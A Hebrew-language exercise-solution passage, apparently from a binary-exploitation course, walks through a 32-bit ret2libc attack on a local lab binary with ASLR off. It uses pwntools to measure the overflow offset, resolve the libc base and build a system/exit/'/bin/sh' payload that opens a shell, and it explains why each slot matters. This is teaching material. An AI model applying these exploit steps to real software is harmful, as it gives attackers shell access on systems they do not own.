...
המצב `NX enabled` הוא הסיבה שאנחנו בכלל צריכים `ret2libc` - אי אפשר shellcode על המחסנית. `No canary` אומר שהגלישה לא נתפסת. `No PIE` פחות קריטי כאן כי ממילא נשתמש בכתובות `libc` ולא בכתובות הבינארי, אבל הוא מקל.
...
core  = p.corefile
fault = core.read(core.esp, 4)          # מה שהיה על ראש המחסנית ב-ret
log.info('offset = %d', cyclic_find(fault))
```

אצלי יצא `offset = 92` (חוצץ 80 + ריפוד יישור + `saved ebp` של 4). אצלכם זה עשוי להיות מעט שונה לפי המהדר - זו הסיבה שמודדים ולא מניחים.
...
בין שתי הרצות הכתובות זהות, כי ASLR כבוי מקבע את בסיס ה-`libc`. אילו ASLR היה פעיל, בסיס ה-`libc` היה מוגרל מחדש בכל הרצה, ושלוש הכתובות היו זזות יחד - ואז לא היינו יכולים לכתוב אותן מראש. שימו לב שכולן במרחק קבוע מבסיס ה-`libc`, ולכן דליפה של אחת מגלה את כולן.

### פתרון תרגיל 3 - exploit ידני ל-shell

מרכיבים את המבנה `[system] [exit] [binsh]` אחרי ריפוד באורך ה-offset:
...
payload = flat({offset: [
    ...
    binsh,      # הארגומנט הראשון: מצביע ל-"/bin/sh"
]})
...
למה זה עבד: ה-`ret` של `vuln` קפץ ל-`system`, שמצאה בראש המחסנית את סלוט ה-`exit` (כתובת החזרה שלה) ומעליו את המצביע ל-`"/bin/sh"` בתור הארגומנט. `system("/bin/sh")` פתחה shell. איך להכליל: זה השלד המינימלי של כל `ret2libc` ב-32 ביט - שלושה ערכים על המחסנית, בלי גאדג'ט אחד.
...
context.binary = elf = ELF('./ret2libc')
libc = elf.libc                      # /lib/i386-linux-gnu/libc.so.6 לפי ldd

p = process('./ret2libc')

# ASLR כבוי -> בסיס libc יציב, שולפים אותו ממפת המיפויים של התהליך
...
למה זה עבד: `libc.address` מקבע את בסיס ה-`libc`, וממנו `symbols` ו-`search` מחזירים כתובות ריצה אמיתיות. איך להכליל: זה בדיוק הסקריפט שנשתמש בו ב-4.4 מול ASLR פעיל - ההבדל היחיד הוא שאת `libc.address` שם נחשב מתוך *דליפה* של כתובת `libc` כלשהי, במקום לשלוף מ-`p.libs()` שעובד רק כי ASLR כבוי.
...
תחת gdb נראה ש-`system` רצה, אבל ברגע שהיא מנסה לקרוא את הארגומנט שלה היא מסתכלת על הסלוט שמיד אחרי כתובת החזרה - שהוא עכשיו `binsh` בתור *כתובת החזרה* שלה, ולא בתור הארגומנט. הארגומנט הראשון הוא מה שמעל, וזה כבר זבל שמעבר לריפוד. התוצאה: `system` מקבלת מצביע לא חוקי כפקודה, או קורסת כשהיא מנסה לחזור ל-`binsh` (שהיא לא כתובת קוד חוקית לחזרה). זו ההוכחה שסלוט החזרה המזויף חובה - בלעדיו הכל מוזז מקום אחד.

שינוי ה-offset ב-4 בתים: אם קטנתם ב-4, הכתובת של `system` נכתבת 4 בתים מוקדם מדי ולא נוחתת בדיוק על סלוט כתובת החזרה - ה-`ret` יקפוץ לזבל ותהיה קריסה. אם גדלתם ב-4, כתובת החזרה נשארת עם 4 בתים מהריפוד המקורי ו-`system` נכתבת בסלוט הלא נכון. בשני המקרים המבנה מתפרק. זה ממחיש כמה ה-offset חייב להיות מדויק לבית.
...
system = libc.symbols['system']
exit_a = libc.symbols['exit']
binsh  = 0xffffd6e2      # כתובת המחרוזת על המחסנית - נמצאה ב-gdb
...
p = conn()
libc.address = p.libs()[libc.path]     # מקומית: יציב כי ASLR כבוי
